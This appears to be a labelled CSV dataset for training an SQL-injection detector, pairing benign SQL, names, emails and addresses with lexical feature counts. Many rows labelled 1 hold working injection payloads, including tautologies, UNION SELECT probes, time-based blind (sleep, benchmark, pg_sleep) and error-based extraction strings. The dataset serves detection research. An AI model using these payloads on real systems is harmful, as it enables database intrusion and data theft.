Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
-3496'   )    )    or 9323  =  9323#,0,1,1,0,0,0,1,0,36,16,12,2,2,0,0,0,1,0,1
SELECT * FROM  ( SELECT instrument FROM busy ) ,0,0,0,0,0,0,0,0,47,10,0,14,2,0,0,0,0,0,0
vilaprio,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,0,0,0,0,0,0,1,0,111,39,20,42,6,0,0,0,0,0,1
SELECT direct FROM church,0,0,0,0,0,0,0,0,25,3,0,12,0,0,0,0,0,0,0
1'||  (  select 'ylio' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',0,3,10,0,0,0,2,0,389,177,55,101,36,0,0,0,4,0,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28555 )  ORDER BY meta_id ASC",0,0,0,0,0,0,0,0,103,17,5,44,2,0,0,2,0,0,0
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,1,1,3,0,0,0,2,0,65,24,20,13,2,0,0,0,1,0,1
altavista@hojainformativa.com.tz,0,0,0,0,0,1,0,0,32,0,0,29,0,0,0,0,0,0,0
SELECT Count ( * )  AS adult,0,0,0,0,0,0,0,0,28,7,0,9,2,0,0,0,0,0,0
1 where 7890  =  7890 or sleep  (  5  )  --,1,1,2,0,0,0,1,0,43,16,10,12,2,0,0,0,0,0,1
SELECT am ( s )  FROM ago FULL OUTER JOIN,0,0,0,0,0,0,0,0,41,10,0,6,2,0,0,0,0,0,0
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,2,0,3,0,2,0,333,125,63,109,22,0,2,6,0,1,1
1  )   where 3979  =  3979 rlike sleep  (  5  )  --,1,0,2,0,0,0,1,0,51,20,10,15,3,0,0,0,0,0,1
"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,1,0,252,108,27,72,25,2,0,4,1,0,1
villanueva del conde,0,0,0,0,0,0,0,0,20,2,0,18,0,0,0,0,0,0,0
"  SELECT negative,but,seldom FROM social LEFT JOIN Orders ON forward.mainlyID =  continent.myself ORDER BY business.temperature",0,0,0,0,0,0,1,0,127,16,0,75,0,0,0,2,0,0,0
SELECT case ( s )  FROM whom LEFT JOIN,0,0,0,0,0,0,0,0,38,9,0,9,2,0,0,0,0,0,0
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1,0,0,0,0,2,0,107,42,27,28,6,0,1,1,0,0,1
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  # tsxs",0,4,0,0,0,0,1,0,125,47,16,40,10,0,0,1,0,0,1
"pl. cantarranillas 21,",0,0,0,0,0,0,0,0,22,2,2,16,0,0,0,1,0,0,0
charissa,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",0,0,0,0,0,0,1,0,166,71,32,41,14,0,3,5,0,0,1
"   SELECT salmon, winter+ ', ' + strange+ ' ' + poor+ ', ' + stronger AS board  FROM exact",0,0,6,0,0,0,0,0,90,22,0,41,0,0,0,3,6,0,0
"INSERT INTO weight  ( remain, select, distant )  VALUES  ( 'shut', 'create', 'tribe' )  ",0,0,0,0,0,0,0,0,88,18,0,40,4,0,0,4,6,0,0
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay',0,0,0,0,0,0,2,0,71,14,0,26,0,0,0,0,4,0,0
SELECT COUNT ( needle )  FROM difficulty,0,0,0,0,0,0,0,0,40,7,0,16,2,0,0,0,0,0,0
1   )    )    and 2006  =  2006,0,1,0,0,0,0,1,0,31,16,9,3,2,0,0,0,0,0,1
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3,0,0,0,0,0,0,1,0,55,9,1,21,0,0,0,0,2,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,0,1,0,0,0,1,1,0,112,26,5,63,3,0,0,4,0,3,1
1' where 8729  =  8729,0,0,0,0,0,0,1,0,22,6,9,5,0,0,0,0,1,0,1
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1,0,3,0,1,0,0,0,54,4,28,14,0,0,0,5,0,0,1
SELECT easier ( s FROM giving RIGHT JOIN,0,0,0,0,0,0,0,0,40,7,0,13,1,0,0,0,0,0,0
"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",0,0,1,0,1,0,1,0,88,14,44,19,1,0,0,7,0,0,1
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",0,2,0,0,0,0,2,0,184,75,39,44,14,0,3,6,4,0,1
SELECT TOP 50 PERCENT * FROM prepare,0,0,0,0,0,0,0,0,36,6,2,7,0,0,0,0,0,0,0
8409,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
haewon7,0,0,0,0,0,0,0,0,7,0,1,6,0,0,0,0,0,0,0
 (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,0,0,0,0,0,0,1,0,139,57,14,56,10,0,0,0,0,0,1
SELECT valuable ( s )  FROM sport,0,0,0,0,0,0,0,0,33,7,0,14,2,0,0,0,0,0,0
laycock_faulds@peaf.sd,0,0,0,0,0,1,0,0,22,0,0,19,0,0,0,0,0,0,0
9.0515E+15,0,0,1,0,0,0,0,0,10,0,7,0,0,0,0,0,0,0,0
"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",1,0,3,0,1,0,0,0,77,18,32,14,3,0,0,6,1,0,1
"INSERT INTO winter  ( dot, successful, tobacco )  VALUES  ( 'root', 'slide', 'flag' )  ",0,0,0,0,0,0,0,0,87,18,0,39,4,0,0,4,6,0,0
SELECT TOP 3 * FROM news WHERE form = 'upon',0,0,0,0,0,0,1,0,44,9,1,12,0,0,0,0,2,0,0
SELECT * FROM frog FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,51,9,2,4,0,0,0,0,0,0,0
cotner,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
SELECT * FROM  ( SELECT locate FROM root ) ,0,0,0,0,0,0,0,0,43,10,0,10,2,0,0,0,0,0,0
5.04489E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,44,8,1,6,0,0,0,0,0,0,0
28721,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"1' union all select null,null,null,null,null,null,null,null,null,null#",0,0,0,0,1,0,0,0,70,4,1,54,0,10,0,9,1,0,1
-6030%'  )   or 3038  =  3038,0,1,1,0,0,1,1,0,29,10,12,2,1,0,0,0,1,0,1
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,2,0,0,0,1,0,82,41,10,20,7,0,0,0,0,0,1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,0,4,0,0,0,0,2,0,171,67,15,64,10,0,0,0,8,0,1
6991,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
robledo,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT MIN ( anywhere )  AS huge FROM in,0,0,0,0,0,0,0,0,40,9,0,14,2,0,0,0,0,0,0
"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",0,0,1,0,1,0,0,0,81,14,40,14,2,0,0,8,1,0,1
desolladamen-te,0,0,1,0,0,0,0,0,15,0,0,14,0,0,0,0,0,0,0
SELECT * FROM Customers  WHERE CustomerName LIKE 'a__%';,0,0,0,0,0,1,0,1,56,8,0,19,0,0,0,0,2,0,0
SELECT COUNT ( active ) FROM block,0,0,0,0,0,0,0,0,34,6,0,11,2,0,0,0,0,0,0
"1""   )    )    union all select null,null,null,null,null#",0,0,0,0,1,0,0,0,57,14,1,34,2,5,0,4,0,1,1
"c/ padilla, 74 12h",0,0,0,0,0,0,0,0,18,3,4,9,0,0,0,1,0,0,0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",0,2,0,0,0,0,2,0,99,38,22,26,6,0,1,1,4,0,1
SELECT * FROM enjoy WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,53,10,4,9,0,0,0,0,0,0,0
SELECT tears FROM gain,0,0,0,0,0,0,0,0,22,3,0,9,0,0,0,0,0,0,0
"-7559"" or 8792  =  6905--",1,1,3,0,0,0,1,0,25,6,12,2,0,0,0,0,0,1,1
1   )    )    as klmm where 3107  =  3107,0,0,0,0,0,0,1,0,41,18,9,11,2,0,0,0,0,0,1
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight',0,0,0,0,0,0,2,0,56,9,0,27,0,0,0,0,4,0,0
SELECT * FROM related WHERE along LIKE '%income%',0,0,0,0,0,2,0,0,49,7,0,18,0,0,0,0,2,0,0
es2eri5o,0,0,0,0,0,0,0,0,8,0,2,6,0,0,0,0,0,0,0
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,11,2,0,0,0,3,0,359,166,53,80,33,0,0,0,0,0,1
SELECT COUNT ( tightID ) FROM noted,0,0,0,0,0,0,0,0,35,6,0,10,2,0,0,0,0,0,0
4270,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"calle goya 46, 10?g",0,0,0,0,0,1,0,0,19,3,4,10,0,0,0,1,0,0,0
4396,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"   SELECT herself,familiar,excellent,proud,volume     (  (  believed JOIN rate ON character.count =  bound.ride )   INNER JOIN clothesON Orders.valley =  throat.westernID ) ",0,0,0,0,0,0,2,0,173,32,0,101,4,0,0,4,0,0,0
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,13,0,0,0,2,0,359,168,58,82,35,0,0,0,1,0,1
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ,0,0,0,0,0,0,0,0,72,14,0,28,2,0,0,0,0,0,0
" SELECT * FROM leaf ORDER BY weight, nearby",0,0,0,0,0,0,0,0,43,8,0,16,0,0,0,1,0,0,0
SELECT DISTINCT composed FROM figure,0,0,0,0,0,0,0,0,36,4,0,14,0,0,0,0,0,0,0
alpuche simani,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
rosa,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
SELECT alike ( s )  FROM life UNION ALL,0,0,0,0,0,0,0,0,39,9,0,10,2,0,0,0,0,0,0
SELECT * FROM season FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM canal,0,0,0,0,0,0,0,0,78,14,3,11,0,0,0,0,0,0,0
1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,0,2,0,0,0,2,0,133,58,21,42,8,0,1,0,0,0,1
"   SELECT tall, desert, market FROM soap WHERE depth  IS NULL",0,0,0,0,0,0,0,0,61,13,0,25,0,0,0,2,0,0,0
SELECT citizen ( s )  FROM news SELECT distant FROM hall,0,0,0,0,0,0,0,0,56,11,0,23,2,0,0,0,0,0,0
SELECT Count ( * )  AS fairly,0,0,0,0,0,0,0,0,29,7,0,10,2,0,0,0,0,0,0
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,2,2,0,0,0,2,0,59,20,4,26,0,0,0,1,0,2,1
19846981m,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""lsvg"" like ""lsvg",0,1,0,0,0,0,0,0,124,25,3,84,3,0,0,2,0,3,1
1.07544E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
1'  )   where 6624  =  6624 and 5392  =  8258,0,1,0,0,0,0,2,0,45,16,17,8,1,0,0,0,1,0,1
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,0,12,1,0,0,0,3,0,361,150,48,101,30,0,0,0,4,0,1
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1,2,2,0,0,1,2,0,59,20,4,26,0,0,0,0,0,2,1
DELETE FROM mood,0,0,0,0,0,0,0,0,16,2,0,4,0,0,0,0,0,0,0
SELECT * FROM somewhere FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,56,9,2,9,0,0,0,0,0,0,0
"callejon giron 124,",0,0,0,0,0,0,0,0,19,2,3,13,0,0,0,1,0,0,0
-7346 or 8571  =  8571--,1,1,3,0,0,0,1,0,24,6,12,2,0,0,0,0,0,0,1
SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3;,0,0,0,0,0,0,1,1,56,7,1,20,0,0,0,0,2,0,0
5756,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
vlez acejas,0,0,0,0,0,0,0,0,11,1,0,10,0,0,0,0,0,0,0
SELECT TOP 3 * FROM other SELECT * FROM fort 3SELECT * FROM up,0,0,0,0,0,0,0,0,62,13,2,11,0,0,0,0,0,0,0
5229,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
SELECT * FROM example WHERE castle NOT BETWEEN 'silly' AND 'addition',0,0,0,0,0,0,0,0,69,10,0,26,0,0,0,0,4,0,0
alpedrete,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
SELECT * FROM expression WHERE path = 'touch' LIMIT 3,0,0,0,0,0,0,1,0,53,9,1,19,0,0,0,0,2,0,0
gatliff.charlton@eco-pro.jm,0,0,1,0,0,1,0,0,27,0,0,23,0,0,0,0,0,0,0
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",1,0,3,0,1,0,0,0,62,14,24,14,2,0,0,4,1,0,1
SELECT already FROM heat UNION ALL SELECT hundred FROM again ORDER BY root,0,0,0,0,0,0,0,0,74,12,0,27,0,0,0,0,0,0,0
SELECT AVG ( scientific ) FROM southern,0,0,0,0,0,0,0,0,39,6,0,18,2,0,0,0,0,0,0
FROM  ( SELECT DISTINCT lion FROM lower ) ,0,0,0,0,0,0,0,0,42,9,0,9,2,0,0,0,0,0,0
" SELECT * FROM direction ORDER BY atom ASC, swimming DESC",0,0,0,0,0,0,0,0,57,10,0,21,0,0,0,1,0,0,0
SELECT about FROM together UNION SELECT tool FROM opinion ORDER BY series,0,0,0,0,0,0,0,0,73,11,0,30,0,0,0,0,0,0,0
danning-marrow@etxarriaranatz.nr,0,0,1,0,0,1,0,0,32,0,0,29,0,0,0,0,0,0,0
3748ny,0,0,0,0,0,0,0,0,6,0,4,2,0,0,0,0,0,0,0
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",0,0,1,0,1,1,0,0,62,18,20,14,3,0,0,3,1,0,1
"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,1,0,0,0,1,0,213,89,37,63,16,0,2,3,0,1,1
48263928s,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",0,1,11,0,0,0,2,0,353,163,50,91,35,0,0,1,0,0,1
SELECT COUNT ( go ) FROM throat,0,0,0,0,0,0,0,0,31,6,0,8,2,0,0,0,0,0,0
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",0,0,1,0,1,0,1,0,107,16,52,25,1,0,0,9,0,1,1
select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',1,2,2,0,0,0,2,0,60,19,4,26,0,0,0,0,3,0,1
SELECT COUNT ( wheel ) FROM lying,0,0,0,0,0,0,0,0,33,6,0,10,2,0,0,0,0,0,0
SELECT * FROM express WHERE dear = 'sense' LIMIT 3,0,0,0,0,0,0,1,0,50,9,1,16,0,0,0,0,2,0,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'idxa'  =  'idxa",0,2,0,0,3,0,2,0,313,113,55,110,20,0,2,6,4,0,1
"1'  )   where 6387  =  6387 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,0,2,0,200,49,20,114,5,0,0,6,1,0,1
"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,2,0,0,0,2,0,286,103,43,107,19,0,2,5,0,0,1
longo,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
gonzalvo gorriti,0,0,0,0,0,0,0,0,16,1,0,15,0,0,0,0,0,0,0
&1c,0,0,0,0,0,0,0,0,3,0,1,1,0,0,0,0,0,0,1
"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",0,0,2,0,1,0,1,0,113,15,52,29,1,0,0,9,3,0,1
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,3,0,0,0,2,0,141,53,23,46,9,0,0,1,3,0,1
or 3  =  3,0,0,0,0,0,0,1,0,10,5,2,2,0,0,0,0,0,0,1
gabby,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
56702228y,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,2,0,0,0,1,0,110,49,13,32,9,0,0,1,0,1,1
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1,0,3,0,1,0,0,0,64,4,36,14,0,0,0,7,0,0,1
"1""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,2,0,0,0,1,0,123,35,8,65,5,0,0,2,0,1,1
SELECT Count ( * )  AS exactly,0,0,0,0,0,0,0,0,30,7,0,11,2,0,0,0,0,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",0,1,0,0,0,0,1,0,125,29,12,72,3,0,0,3,0,0,1
"INSERT INTO pick ( tip, could, specific, far, explore, seat )  VALUES  ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )  ",0,0,0,0,0,0,0,0,150,24,0,82,4,0,0,10,13,0,0
d9str7par,0,0,0,0,0,0,0,0,9,0,2,7,0,0,0,0,0,0,0
"-5691' union all select 6610,6610#",0,0,1,0,1,0,0,0,34,4,12,14,0,0,0,1,1,0,1
50269,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,12,0,0,0,2,0,356,168,55,83,35,0,0,0,1,0,1
SELECT * FROM alone WHERE    NOT single = 'officer',0,0,0,0,0,0,1,0,51,11,0,18,0,0,0,0,2,0,0
 UPDATE lost SET capital = 'careful'WHERE them = 'chair',0,0,0,0,0,0,2,0,56,9,0,27,0,0,0,0,4,0,0
faustino cavadas 162 6-a,0,0,1,0,0,0,0,0,24,3,4,16,0,0,0,0,0,0,0
2.89989E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
inescourt7@citycvs.mil,0,0,0,0,0,1,0,0,22,0,1,19,0,0,0,0,0,0,0
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',0,2,1,0,0,2,2,0,63,28,16,5,4,0,0,0,4,0,1
DELETE FROM half,0,0,0,0,0,0,0,0,16,2,0,4,0,0,0,0,0,0,0
"-6659'  )   where 1256  =  1256 union all select 1256,1256--",1,0,3,0,1,0,1,0,60,14,20,19,1,0,0,1,1,0,1
SELECT RADIANS ( -45 ) ;,0,0,1,0,0,0,0,1,24,5,2,0,2,0,0,0,0,0,0
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,63,12,1,13,0,0,0,0,2,0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 438 )  ORDER BY meta_id ASC",0,0,0,0,0,0,0,0,101,17,3,44,2,0,0,2,0,0,0
"  UPDATE second SET rocket =  'hearing', City =  'use' WHERE test =  slept",0,0,0,0,0,0,3,0,74,17,0,34,0,0,0,1,4,0,0
SELECT TOP 3 * FROM been,0,0,0,0,0,0,0,0,24,5,1,4,0,0,0,0,0,0,0
SELECT * FROM having WHERE flew = 'not'  OR hill = 'say',0,0,0,0,0,0,2,0,56,12,0,20,0,0,0,0,4,0,0
SELECT * FROM complex WHERE NOT nervous = 'slept'  AND NOT real = 'pie',0,0,0,0,0,0,2,0,71,14,0,26,0,0,0,0,4,0,0
1'  )   as tvqn where 2967  =  2967,0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,1,0,1
SELECT prevent ( s )  FROM saw,0,0,0,0,0,0,0,0,30,7,0,11,2,0,0,0,0,0,0
3.4285E+15,0,0,1,0,0,0,0,0,10,0,7,0,0,0,0,0,0,0,0
6310,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
" SELECT column_name ( s )  FROM usual,change",0,0,0,0,0,0,0,0,44,8,0,22,2,0,0,1,0,0,0
"-6611%""   )    )     )   union all select 8918,8918#",0,0,1,0,1,1,0,0,52,18,12,14,3,0,0,1,0,1,1
hermanos barral 61,0,0,0,0,0,0,0,0,18,2,2,14,0,0,0,0,0,0,0
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,1,3,0,1,2,2,0,87,29,4,35,2,0,0,1,0,0,1
SELECT * FROM diagram WHERE string = 'bicycle' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,70,12,1,20,0,0,0,0,2,0,0
"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,2,0,0,0,2,0,263,100,79,53,18,0,3,6,0,1,1
SELECT * FROM kept WHERE also NOT LIKE '[primitive]%',0,0,0,0,0,1,0,0,53,8,0,17,2,0,0,0,2,0,0
eugen-fargue@andrestabernero.im,0,0,1,0,0,1,0,0,31,0,0,28,0,0,0,0,0,0,0
SELECT * FROM ill WHERE fox BETWEEN through09/01/1996damage AND trail15/31/1996some,0,0,0,0,0,0,0,0,83,9,16,28,0,0,0,0,0,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,0,3,0,0,0,1,1,0,173,67,16,60,15,2,0,4,0,3,1
"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",0,0,1,0,1,0,1,0,67,16,20,25,1,0,0,1,1,0,1
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1,1,2,0,1,0,1,0,81,25,5,42,2,0,0,1,0,1,1
SELECT * FROM frame,0,0,0,0,0,0,0,0,19,3,0,5,0,0,0,0,0,0,0
pleiteador,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
1   )    )    or sleep  (  __TIME__  )  #,0,1,0,0,0,0,0,0,41,20,1,7,4,0,0,0,0,0,1
26111,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
ar2e5tad6,0,0,0,0,0,0,0,0,9,0,3,6,0,0,0,0,0,0,0
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",0,2,0,0,0,0,2,0,161,55,39,45,10,0,3,6,0,4,1
SELECT vapor ( s )  FROM very SELECT see ( s ) ,0,0,0,0,0,0,0,0,47,13,0,14,4,0,0,0,0,0,0
